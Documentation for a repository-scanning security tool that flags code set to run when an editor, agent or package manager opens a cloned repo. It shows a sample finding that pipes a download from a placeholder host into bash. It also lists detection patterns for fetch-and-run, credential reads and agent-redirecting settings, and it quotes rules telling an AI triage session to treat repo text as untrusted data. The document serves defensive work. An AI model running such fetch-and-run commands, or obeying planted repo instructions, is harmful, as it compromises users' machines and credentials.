# Check a repo before you open it

A repo you cloned from GitHub can run code on your machine as soon as an editor, an agent or a package manager touches it. `anthology check-repo` reads the repo's files and tells you what would run, before you open it.

This page covers why the check belongs outside the repo, how to run it on a folder or a git URL, what it looks for, what its verdicts and exit codes mean, the optional tools it calls, what the LLM notes add, and what it cannot see.

## Why run it before you open the repo

Several kinds of file run code on their own:

- an install script in `package.json`, or a build script in `setup.py`, `build.rs` or a `Makefile`;
- an editor task set to start when the folder opens. Fake job-interview repos have shipped hundreds of `.vscode/tasks.json` files that download and run a payload this way ([Trend Micro](https://www.trendmicro.com/en/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html));
- a dev container command that runs on your host;
- Claude Code's own settings: hooks, the `env` block, helper commands such as `apiKeyHelper`, and `.mcp.json` servers.

The last one is why the check cannot run inside the repo's own session. In `claude -p` and Agent SDK runs there is no trust dialog, and a folder's hooks, `env` block and helper commands are used. Servers in `.mcp.json` connect without asking ([What runs before you trust a folder](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)). In an interactive session the trust dialog asks once for the whole folder. It does not scan what the folder will run, and once you accept, the repo's files steer the session.

So run the check from outside: in a terminal before you start `claude` in the repo, or from a Claude Code session started in another folder.

The check itself is built to be safe to run on hostile input:

- It reads files and nothing else. It runs no package manager, build, hook, MCP server or submodule, and it installs nothing.
- It never follows a symlink and never reads outside the folder you name. A link to something outside is reported, and what it points at is not read.
- It uses the network only to fetch a URL you give it.
- Text from the repo is data. The report shows hidden characters as escapes and masks anything that looks like a key.

## Run it from a terminal

The command ships in the `anthology` plugin as `bin/anthology`. Inside a Claude Code session that folder is on your path. In a plain terminal, call it by its full path. The plugin folder is the `installPath` of `anthology@anthology` in `~/.claude/plugins/installed_plugins.json`, and it looks like this:

```text
~/.claude/plugins/cache/anthology/anthology/<version>/bin/anthology check-repo ~/src/some-repo
```

The wrapper installs the pinned binary first if it is missing (see [The `anthology` binary](binary.md)). It exits 127 when it cannot.

```text
anthology check-repo [--json] [--opened] [--no-tools] [--all] [--rev REV] [--into DIR] TARGET
anthology check-repo --notice
```

| Option | What it does |
|---|---|
| `TARGET` | An existing folder, or a git URL (see [Check a git URL](#check-a-git-url)). |
| `--json` | Prints one JSON object on stdout instead of the text report (see [Scripts and CI](#scripts-and-ci)). |
| `--opened` | Says the folder is already open in Claude Code. The report starts with a warning (see [If the repo is already open](#if-the-repo-is-already-open)). |
| `--no-tools` | Skips the optional tools (see [Optional tools](#optional-tools)). |
| `--all` | Also walks `node_modules/` and `.claude/worktrees/`, which are skipped by default. |
| `--rev REV` | For a URL: the branch, tag or commit to fetch. The default is the remote's `HEAD`. |
| `--into DIR` | For a URL: the folder to fetch into. It must not exist yet. |
| `--notice` | Prints the license notice for the bundled GuardDog rules and exits 0 (see [Licenses](#licenses)). |

The report goes to stdout. An error goes to stderr as one line, `anthology check-repo: <message>`. A wrong option or a missing target is an error too.

To open the repo only when the check is clean:

```text
anthology check-repo ~/src/some-repo && cd ~/src/some-repo && claude
```

Exit 0 means no HIGH or CRITICAL finding and a complete scan. It does not mean the repo is safe (see [What it cannot see](#what-it-cannot-see)).

## Run it from another session

Start Claude Code in a folder that is not the repo, such as your home folder or a scratch folder, and run:

```text
/anthology:check-repo ~/src/some-repo
/anthology:check-repo https://github.com/owner/repo
```

The skill runs `check-repo --json` on the target and prints the report field unchanged. The exit code and the verdict are final. Then it adds notes of its own (see [LLM notes](#llm-notes)). Claude can also run the skill when you ask it to check a clone.

- A target with a quote, a backtick, a `$` or a control character in it is refused. The skill passes the target in single quotes, and these characters would break out of them.
- With no target, the skill checks the repo the session is in, and adds `--opened`. It adds `--opened` for any path that holds the session's folder, too.

## Check a git URL

A URL target must start with `https://`, `ssh://` or `git@<host>:`. A URL that starts with `-`, holds whitespace or a control character, or uses `file:` or `ext::` is refused. For a folder on your disk, give the path.

The check fetches the repo into a quarantine folder and scans that. The default folder is `~/.claude/anthology/check-repo/<host>-<owner>-<repo>-<epoch>`, created with mode 0700. `--into DIR` picks another one. The folder stays after the check, so you can look at it, move it or delete it. The report names it and prints `To work in it: git -C '<folder>' status`.

The fetch is git with the risky parts turned off:

- one commit at `--depth 1`, no tags, no submodules, no Git LFS content;
- no hooks, no `fsmonitor`, no `file` or `ext` protocol, and objects are checked for corruption as they arrive;
- symlinks are written as plain files that hold the link target, so nothing in the copy can point outside it;
- your user and system git config are ignored, the environment is cleared down to a short list, and git never asks for a credential. An ssh URL uses your agent through `SSH_AUTH_SOCK`.

It needs git 2.32 or newer. The whole fetch has a 120 second limit. If it fails for any reason (a bad URL, a private repo over https, no network, a timeout), the half-made folder is removed and the command exits 3.

The quarantine copy is a normal clone, apart from the symlinks. Reading the report is the point. Do not open the folder in an editor or agent until you have.

## If the repo is already open

Sometimes the session is already in the repo. The check still helps: it reads install scripts, editor tasks and hidden code that have not run yet. What it cannot undo is what already ran. With `--opened`, the report starts with this warning:

> This folder is already open in Claude Code. Its hooks, env settings and MCP servers may have run when the session started, so the agent findings below may already have acted. If any agent finding is HIGH or CRITICAL: end this session, do not start Claude Code in this folder again, and rotate the API keys and tokens this machine holds. Install scripts, builds and editor tasks have not run unless you ran them.

Two things lead you here without your asking:

- **Setup.** When `/anthology:setup` finishes, it asks whether to run the check on the repo. It says first that Claude Code is already open there, so the repo's hooks, env settings and MCP servers may have run, and that the safest check for a repo you did not write runs before you open Claude Code in it. If you say yes, it runs the skill with `--opened`.
- **Session start.** When you start Claude Code in a repo that has files which run code on open, the start message adds one line, once for each repo:

  > anthology: this repo has files that run code when Claude Code or an editor opens it (`{list}`). If you did not write it, check it with /anthology:check-repo `<path>` from a session in another folder; its hooks may already have run in this one.

  The list names what it found, from these labels: hooks, env or helper commands in `.claude/settings.json`; the same in `.claude/settings.local.json`; `.mcp.json` servers; a VS Code task that runs on folder open; `.envrc`. It reads each file up to 256 KiB. The line is not sent on resume, clear or compact, or in a session another program drives (see [Host mode](agents.md#host-mode)).

## What it checks

The scan walks every file under the folder, including hidden ones, and sorts each into a kind: code (by extension), agent instructions, docs, config, data or binary. Code files are matched by language, and Markdown and other docs never trigger the payload or exfiltration rules, so a `curl ... | sh` in a README is not a finding. A repeated hit in one file is one finding with a count.

The folder `.git` is not walked. In a folder, the check reads only `.git/config` and lists the files in `.git/hooks` that do not end in `.sample`. In a fetched copy, git's own file modes tell it which entries are symlinks and submodules. A submodule is listed and not fetched.

Each finding carries a rule ID. The part before the first dot is its group:

| Group | What it looks at | Examples |
|---|---|---|
| `agent` | Files that steer an AI agent: `.claude/settings.json` and `.claude/settings.local.json` at any depth, `.mcp.json`, `.cursor/mcp.json`, `.codex/config.toml`, skill and agent frontmatter, `.env*` | Hook, status line and credential-helper commands. `env` keys that redirect traffic or tools (`ANTHROPIC_BASE_URL`, `*_BASE_URL`, proxies, `NODE_OPTIONS`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`) are CRITICAL. `enableAllProjectMcpServers: true`, a broad `Bash` allow rule and `additionalDirectories` outside the repo are HIGH. A stdio MCP server that runs an unpinned package is MEDIUM. |
| `autorun` | Anything that runs on open, install or build | npm lifecycle scripts and `start` scripts, `.vscode/tasks.json` folder-open tasks, a dev container `initializeCommand`, `Makefile`, `*.m4` and `configure` lines, `.envrc`, pre-commit, husky and `Justfile` commands, `.csproj` build events, `setup.py` overrides, `pyproject.toml` `backend-path`, `build.rs`, `.cargo/config.toml` wrappers and runners, a Gradle or Maven wrapper that fetches from another host, `.gitmodules`, `.gitattributes` filters, `.git/hooks`, `.git/config` commands, `.npmrc`, `yarnPath`, and symlinks that point outside the folder |
| `hidden` | Text a reviewer cannot see | Bidirectional controls, zero-width characters, Unicode tag characters (CRITICAL in agent files), runs of variation selectors, code pushed past 150 spaces or tabs on a line, file names that mix Latin with Cyrillic or Greek |
| `payload` | Hidden or disguised code | A font or image file that holds script text or has an executable's header (HIGH), committed executables, `.pyc` files, archives, long base64 or hex blobs, a decoder and an executor in one file |
| `exfil` | Where data would go | Discord, Telegram and similar webhooks, paste and tunnel hosts, reads of `~/.ssh`, cloud and browser credential paths, `process.env` sent over the network, miner pool strings, AI command-line tools started with their permission checks off |
| `deps` | Lockfiles and package settings | Resolved URLs on a host other than the default registry, `http:` URLs, a package name that does not match its URL, extra index URLs in `requirements*.txt` and `pip.conf`, `go.mod` `replace` lines |
| `yara` | Code files | The threat rules from Datadog's GuardDog, run by a small evaluator built into the binary |
| `scanner` | Files that switch scanners off | `.gitleaks.toml`, `.gitleaksignore`, `.semgrepignore`, `zizmor.yml`, `osv-scanner.toml`, `.guarddog*`, `.trufflehogignore`, `.atl/filters.toml`, inline `gitleaks:allow` and `nosemgrep` |

Every auto-run file also gets one INFO finding, so the report lists what would run even when it looks fine.

A repo can ship scanner settings meant to hide its own problems. The check never obeys them. It reports each one as LOW.

The agent instruction files (`CLAUDE.md`, `CLAUDE.local.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.windsurfrules`, `.clinerules`, `.github/copilot-instructions.md`, and the folders `.cursor/rules/`, `.claude/rules/`, `.claude/commands/`, `.claude/agents/`, `.claude/skills/`, `.github/instructions/` and `.github/prompts/`) get the hidden-text rules. Whether their words are a trap is a judgment that rules cannot make, so the JSON output hands them to the LLM notes.

### Limits on the walk

- At most 100,000 files and 512 MiB read in total. Text rules read at most 2 MiB of a file.
- UTF-8 and UTF-16 with a byte order mark are read. A file that is not valid UTF-8 is skipped by the text rules. A CRLF line break counts as one line.
- Hitting a cap makes the scan partial.

## Severities, verdicts and exit codes

An auto-run command gets its level from two things: when it runs, and what the command does.

When it runs:

- **Open.** When you open the folder in an editor or an agent: folder-open tasks, dev container host commands, Claude Code hooks.
- **Install.** When a package manager installs: `preinstall`, `install` and `postinstall` scripts.
- **Build.** When you build or prepare: `prepare`, `prepublish`, `prepack`, `Makefile` and `.csproj` steps.
- **Opt-in.** After a step you take: `direnv allow`, `pre-commit install`, husky hooks, a `Justfile` recipe.

What the command does, from least to most worrying:

- **Allowlisted.** An exact, known-harmless command such as `husky install`, `node-gyp rebuild`, `patch-package`, `prisma generate` or `tsc`.
- **Plain.** Anything else.
- **Runner.** `npx`, `pnpm dlx`, `uvx`, `pipx run` and the like, which fetch and run a package.
- **Network.** A URL with a host other than localhost, or `curl`, `wget`, `nc`, `scp`, `ftp`, or a public IP address.
- **Fetch and run.** A download piped into a shell or interpreter, `mshta`, `certutil -urlcache`, or an interpreter one-liner that fetches a URL.
- **Decode and run.** `base64 -d` piped into a shell, `powershell -enc`, or `eval` of decoded text.
- **Runs data.** An interpreter started on a file named like a font, image, document or data file, as in `node public/fonts/icons.woff2`.

| Runs on | Allowlisted | Plain | Runner | Network | Fetch and run, decode and run, runs data |
|---|---|---|---|---|---|
| Open | INFO | MEDIUM | MEDIUM | HIGH | CRITICAL |
| Install | INFO | MEDIUM | MEDIUM | HIGH | CRITICAL |
| Build | INFO | INFO | LOW | MEDIUM | CRITICAL |
| Opt-in | INFO | INFO | LOW | LOW | HIGH |

Two adjustments apply after the table:

- A command that runs a file, such as `node scripts/setup.js`, takes the level of that file's findings. If the file has a HIGH or CRITICAL finding, the command is CRITICAL (HIGH for an opt-in). `npm run <script>` is followed one level into the same folder's `package.json`.
- Some surfaces have a floor: a credential helper or an `npm start` script that runs a data file is never below HIGH. A GuardDog hit in a file that a script reaches, or in `setup.py` or `build.rs`, goes one level up, to HIGH at most.

GuardDog rules are scaled down: its `high` becomes MEDIUM, `medium` becomes LOW and `low` becomes INFO. They are a signal to read, not a verdict, until a script reaches the file.

What each level asks of you:

| Level | Meaning | What to do |
|---|---|---|
| CRITICAL | A known-malicious dependency, or code that runs on open, install or build and fetches and runs, decodes and runs, runs a data file or reaches a HIGH file. Also an agent `env` redirect. | Do not install, build or open the repo in an editor or an agent. |
| HIGH | An auto-run command that reaches the network, agent config that runs commands or takes credentials, hidden text in code, a disguised file. | Read it before you open the repo. |
| MEDIUM | Suspicious but common: an install script that is not on the allowlist, an odd registry, an unexplained blob. | Look at it. |
| LOW | Worth knowing: scanner settings in the repo, opt-in automation, known vulnerabilities. | Note it. |
| INFO | The inventory of auto-run files. | None. |

The report opens with a verdict, and these are the exact texts:

| Verdict | When |
|---|---|
| `Do not open` | Any CRITICAL finding |
| `Review before opening` | Any HIGH finding, and no CRITICAL |
| `No known-bad signals found` | Neither |

The exit code follows the same order, and a failed or partial scan can outrank a HIGH:

| Exit | When |
|---|---|
| 2 | Any CRITICAL finding, even if the scan was partial |
| 3 | No CRITICAL, and the scan failed, stopped at a cap, or the command line was wrong |
| 1 | No CRITICAL, no failure, and any HIGH |
| 0 | Anything else |

With `--opened`, the opened warning comes before the verdict. After that the header has these lines, in this order:

1. The verdict.
2. The counts, on one line: `CRITICAL 0  HIGH 1  MEDIUM 2  LOW 0  INFO 5`.
3. `target:`, the URL as you gave it for a URL scan, or the canonical folder path for a folder scan.
4. `rev:`, the branch, tag or commit. A URL scan only.
5. `scanned: N files in N ms`.
6. `skipped:`, the folders the walk skipped, up to 8 and then `… N more`. It appears only when something was skipped.
7. `partial:`, `a cap stopped the scan before every file was read`. It appears only when a cap stopped the scan.
8. `error:`, one line for each error, up to 5. It appears only when there was an error.
9. `tools:`, the optional tools that ran, each with its finding count, or `none`.
10. One `not run:` line for each optional tool that did not run. It says whether the tool was not on your `PATH` (with what it would add), failed or was skipped, and why.
11. `quarantine:`, the fetched folder. A URL scan only. It is followed by `To work in it: git -C '<dest>' status`, unless the folder name holds a quote, a control character or a hidden character, or starts with `-`.
12. `No findings is not proof of safety.`

Findings come next, highest level first. Inside a level, agent findings come before auto-run, then hidden text, payload, exfiltration, dependencies, GuardDog, tools and scanner files, and then by path and line. Each block gives:

- `why`: one sentence on the rule;
- `seen`: the text found, cut to 160 characters;
- `do`: one action.

This is an example of one finding block. It is a made-up fixture, not output from a real repo:

```text
[CRITICAL] F1 autorun.vscode-folder-open .vscode/tasks.json:7 (3 hits)
  why:  A task runs when the folder opens and fetches a script.
  seen: curl -s https://example.invalid/p.sh | bash
  do:   Do not open this folder in an editor or an agent.
```

The first line holds the level, the finding number, the rule ID, and the file and line. The number matches the `id` in the JSON.

- `(N hits)` appears only when a finding repeats in the same file.
- A finding about a whole file has no `:line`.
- Text from the repo is escaped onto one line. A line break and a tab are written out as `\n` and `\t`. Hidden characters show as `\u{202E}` style escapes, and a byte that is not valid UTF-8 shows as `\x{FF}`.
- A string that looks like a key shows as `<secret:label>`, such as `<secret:github-token>`.

Every CRITICAL and HIGH finding prints. Lower levels print until the report holds 200 blocks, then it says `… N more lower findings: run with --json`.

## Optional tools

When these programs are already on your `PATH`, the check calls them, and it adds their findings. It never installs them. Pass `--no-tools` to skip them. Each runs from a scratch folder outside the repo, with a cleared environment (`PATH`, `HOME` and `OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY` only, never `GITHUB_TOKEN` or `GH_TOKEN`), for at most 60 seconds, in parallel with the others.

A repo can steer each of these tools with a settings file it carries. The flags below turn that off. `<target>` is the folder, and `<scratch>` is the scratch folder.

```text
osv-scanner scan source -r --offline --config=<scratch>/osv-scanner.toml --format json <target>
gitleaks dir --config <scratch>/gitleaks.toml --ignore-gitleaks-allow --no-banner --redact --report-format json --report-path <scratch>/gitleaks.json --exit-code 0 <target>
zizmor --offline --no-config --format json <target>
```

| Tool | What it adds | Notes |
|---|---|---|
| OSV-Scanner | Known-malicious and vulnerable versions in lockfiles | A `MAL-` record is CRITICAL (`deps.osv-malicious`). Other known vulnerabilities are LOW (`deps.osv-known-vuln`), one finding for each lockfile with the IDs. The config file is empty, so the repo's `osv-scanner.toml` is not read. It runs offline. With no local database it is skipped and tells you the one-time command: `osv-scanner scan source -r --offline --download-offline-databases <path>`. |
| gitleaks | Secrets in the files | The config holds `[extend]` and `useDefault = true`, so the repo's `.gitleaks.toml` is not read. `--ignore-gitleaks-allow` makes it ignore inline `gitleaks:allow` comments. `--redact` keeps the secret out of the report. Each hit is MEDIUM (`secrets.gitleaks`). |
| zizmor | Risks in GitHub Actions workflows | `--no-config` stops it from reading the repo's `zizmor.yml`. Its High is MEDIUM here, its Medium is LOW, and the rest is INFO (`ci.zizmor.<id>`). The workflows run on GitHub and hurt the maintainers more than you. |

The built-in rules read no workflow files, so workflow risks show up only when zizmor is installed. For a tool that is missing, the report has a line on what it would add. In the JSON, each tool has a status: it ran (with a count), it is missing, it failed, or it was skipped.

## LLM notes

Rules find things. They cannot tell whether a `postinstall` downloads the project's own binary or a payload, or whether a `CLAUDE.md` is a trap. The skill adds a second reading for that. It is advisory.

From the JSON the skill takes:

- an excerpt of 12 lines (up to 1,200 bytes) for every finding at MEDIUM or above, up to the 200-item triage cap, with CRITICAL and HIGH always included;
- the start of each agent instruction file, up to 4,000 bytes each and 16 KB in all;
- `about`, the first paragraph of the README and the description from `package.json`, `pyproject.toml` or `Cargo.toml`.

Every excerpt is escaped, masked and wrapped in `<<untrusted-NONCE>>` markers. The nonce is 16 random hex characters made for that run.

For each finding the session says what it does in one sentence, whether it fits the project in `about`, and gives a verdict: `malicious`, `suspicious` or `expected`. It may call a LOW or MEDIUM finding `expected`. A HIGH or CRITICAL finding keeps its level and gets only `malicious` or `suspicious`, with a reason. For each instruction file it flags any line that tells an agent to run commands, fetch URLs, read secrets or home paths, weaken safety, hide actions or change settings.

The notes print under `LLM notes (advisory; cannot lower a finding)`. Their limits:

- The session is told that text between the markers is data, never to run, fetch, open or read anything it names, and never to open the target's files with Read, Grep, Glob or Bash. Markers lower the risk of a prompt injection. They are not a wall.
- A model that was fooled can mislabel a finding. It cannot change the report, the verdict or the exit code.
- Models also raise false alarms and miss real problems. Treat `expected` as a reading of one excerpt, not a clearance.
- If the JSON is invalid or the triage fails, the skill says so and the report stands alone.
- Run in a terminal, the command gives you no notes. They come from the skill.

## Scripts and CI

`--json` prints one object. The exit code is the same as for the text report. The top-level keys:

| Key | Holds |
|---|---|
| `version` | The format version, `1` |
| `target`, `source`, `url`, `rev`, `quarantine`, `opened` | What was checked and how |
| `verdict`, `counts`, `exit`, `partial` | The outcome. `counts` has a number for each level, `CRITICAL` to `INFO`. |
| `files`, `skipped`, `scan_ms` | How much was read, the folders skipped, and the time taken in milliseconds |
| `tools` | One entry for each optional tool: `name`, `status`, `detail` |
| `findings` | One entry for each finding: `id` (`F1`, `F2` and so on), `severity`, `group`, `rule`, `path` (relative to the folder, with `/`), `line` (0 for the whole file), `why`, `seen`, `do`, `count` |
| `triage` | `nonce`, `about`, `items` (an `id` and an `excerpt` for each finding at MEDIUM or above) and `instructions` (a `path` and an `excerpt` for each file) |
| `report` | The text report |
| `notes` | Notes about the run |

At most 200 items go to `triage`. CRITICAL and HIGH findings are never dropped, and a note says how many lower-severity findings were left out.

## What it cannot see

No findings is not proof of safety. The check looks for known-bad shapes in the text of the files. A careful author can write code that none of the rules match, and a rule can fire on honest code. MEDIUM and LOW findings are often fine.

Things it does not do or does not read:

- It runs nothing, so it cannot see what code does at run time.
- It reads no git history, only `.git/config` and `.git/hooks` in a folder.
- It does not open archives and binaries. It records that they exist and what their first bytes say they are.
- It does not fetch a submodule or a dependency. It reads lockfiles, and with OSV-Scanner it matches them against known-malicious versions.
- It skips `node_modules/` and `.claude/worktrees/` unless you pass `--all`, and it reads only the first 2 MiB of a file for text rules.
- It does not read workflow files, unless zizmor is installed.

Left out on purpose for now: lists of typosquatted package names, a checksum table for the Gradle wrapper jar (the check looks at the wrapper's download host and whether a jar is present), SARIF output, and mixed-script identifiers inside code (mixed-script file names are checked).

## Licenses

The `yara` rules are the threat rules of [GuardDog](https://github.com/DataDog/guarddog) from Datadog, under the Apache-2.0 license. The binary carries its license and notice text. `anthology check-repo --notice` prints them.
